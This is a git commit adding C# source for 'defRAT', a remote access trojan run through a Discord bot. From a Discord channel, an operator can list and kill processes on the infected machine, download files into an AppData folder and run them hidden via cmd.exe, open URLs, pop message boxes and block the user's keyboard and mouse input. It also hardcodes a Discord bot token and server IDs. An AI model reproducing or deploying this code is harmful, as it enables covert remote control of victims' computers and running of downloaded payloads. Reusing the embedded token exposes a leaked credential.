921da9cfe4c1310687a5d102de685e4250b25459
ptyxx <74645373+ptyxx@users.noreply.github.com>
2021-02-19 11:18:24 +0100

    Add files via upload

---
+++ Modules/CommandsModule.cs
@@ -0,0 +1,150 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Configuration;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Discord;
+using Discord.Commands;
+
+namespace defRAT.Modules
+{
+    public class CommandsModule : ModuleBase<SocketCommandContext>
+    {
+        [Command("tasklist")]
+        public async Task TaskListAsync()
+        {
+            Process[] processes = Process.GetProcesses();
+
+            string msg = "Processes:\n```";
+            List<string> sent = new List<string>();
+            foreach (Process process in processes)
+            {
+                if (sent.Contains(process.ProcessName)) continue;
+                sent.Add(process.ProcessName);
+                msg += process.Id + " | " + process.ProcessName + "\n";
+            }
+            msg += "```";
+
+            await ReplyAsync(msg);
+        }
+
+        [Command("taskkill")]
+        public async Task TaskKillAsync(string id)
+        {
+            try
+            {
+                Process process = Process.GetProcessById(int.Parse(id));
+                process.Kill();
+                await ReplyAsync("Killed process " + process.ProcessName);
+            } catch (ArgumentException)
+            {
+                await ReplyAsync("This process does not exist!");
+            }
+            
+        }
+
+        [Command("killname")]
+        public async Task KillByNameAsync(string name)
+        {
+            Process[] processes = Process.GetProcessesByName(name);
+            if (processes.Length >= 1)
+            {
+                int counter = 0;
+                foreach (Process process in processes)
+                {
+                    process.Kill();
+                    counter += 1;
+                }
+
+                await ReplyAsync("Killed `" + counter + "` processes");
+            } else
+            {
+                await ReplyAsync("No processes found");
+            }
+        }
+
+        [Command("upload")]
+        public async Task UploadFileAsync()
+        {
+            foreach (IAttachment attachment in Context.Message.Attachments)
+            {
+                using (var client = new WebClient())
+                {
+                    
+                    client.DownloadFile(
+                        new Uri(attachment.Url), 
+                        attachment.Filename
+                        );
+
+                    File.Move(attachment.Filename, Program.RAT_DIR_PATH + @"\"+attachment.Filename);
+                }
+            }
+
+            await ReplyAsync("Downloaded");
+        }
+
+        [Command("dir")]
+        public async Task DirAsync()
+        {
+            string[] files = Directory.GetFiles(Program.RAT_DIR_PATH);
+            string msg = "Rat Files:\n```";
+            foreach (string file in files)
+            {
+                msg += file + "\n";
+            }
+            msg += "```";
+            await ReplyAsync(msg);
+        }
+
+        [Command("start")]
+        public async Task StartAsync(string file)
+        {
+            Process process = new Process();
+            ProcessStartInfo info = new ProcessStartInfo();
+            info.WindowStyle = ProcessWindowStyle.Hidden;
+            info.FileName = "cmd.exe";
+            info.Arguments = "/C start " + Program.RAT_DIR_PATH + @"\" + file;
+            process.StartInfo = info;
+            process.Start();
+
+            await ReplyAsync("Started " + file);
+        }
+
+        [Command("msgbox")]
+        public async Task MsgBoxAsync(string title, string text)
+        {
+           
+            Thread msgBox = new Thread(() => MessageBox.Show(text, title));
+            msgBox.Start();
+            await ReplyAsync("Showed msgbox!");
+        }
+
+        [Command("visiturl")]
+        public async Task VisitUrlAsync(string url)
+        {
+            Process.Start(url);
+            await ReplyAsync("Visiting the url");
+        }
+
+        [Command("block")]
+        public async Task BlockAsync()
+        {
+            Program.BLOCKED = !Program.BLOCKED;
+            if (Program.BLOCKED)
+            {
+                Program.BlockInput(true);
+            } else
+            {
+                Program.BlockInput(false);
+            }
+
+            await ReplyAsync("Locked: " + Program.BLOCKED);
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using defRAT.Services;
+using Microsoft.Extensions.DependencyInjection;
+using Discord;
+using Discord.Commands;
+using Discord.WebSocket;
+using System.IO;
+using Timer = System.Timers.Timer;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+namespace defRAT
+{
+    class Program
+    {
+        private DiscordSocketClient _client;
+
+        private string TOKEN = "Nzc0OTIzMTgzMzkxNzY4NTg3.X6e1dA.2S9OdKV4A9zoWxKo6bR_Uv7T8BI";
+
+        public static string RAT_DIR_PATH;
+        public static bool BLOCKED = false;
+
+        private ulong GUILD_ID = 774921535206850580;
+        private ulong CHANNEL_ID = 774921611786059796;
+        static void Main(string[] args)
+        {
+            new Program().MainAsync().GetAwaiter().GetResult();
+        }
+
+        [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "BlockInput")]
+        [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
+        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);
+
+    public async Task MainAsync()
+        {
+            Thread t = new Thread(() => MessageBox.Show("lllll"));
+            t.Start();
+            string appdata = Environment.GetEnvironmentVariable("APPDATA");
+            RAT_DIR_PATH = Directory.CreateDirectory(appdata + @"\defRat").FullName;
+
+            _client = new DiscordSocketClient();
+
+            var services = ConfigureServices();
+            await services.GetRequiredService<CommandHandlingService>().InitializeAsync(services);
+
+            await _client.LoginAsync(TokenType.Bot, TOKEN);
+            await _client.StartAsync();
+            
+            _client.Ready += _client_Ready;
+            _client.LoggedOut += _client_LoggedOut;
+            
+            await Task.Delay(-1);
+        }
+
+        private IServiceProvider ConfigureServices()
+        {
+            return new ServiceCollection()
+                .AddSingleton(_client)
+                .AddSingleton<CommandService>()
+                .AddSingleton<CommandHandlingService>()
+                .BuildServiceProvider();
+        }
+
+        public async Task _client_Ready()
+        {
+            await _client.SetActivityAsync(new Game("Connected!"));
+            await _client.GetGuild(GUILD_ID).GetTextChannel(CHANNEL_ID).SendMessageAsync("Connected to VM at **"+ DateTime.Now.ToString("HH:mm:ss")+"**");
+        }
+
+        private async Task _client_LoggedOut()
+        {
+            await _client.GetGuild(GUILD_ID).GetTextChannel(CHANNEL_ID).SendMessageAsync("Disconnecting at **" + DateTime.Now.ToString("HH:mm:ss") + "**");
+        }
+    }
+}
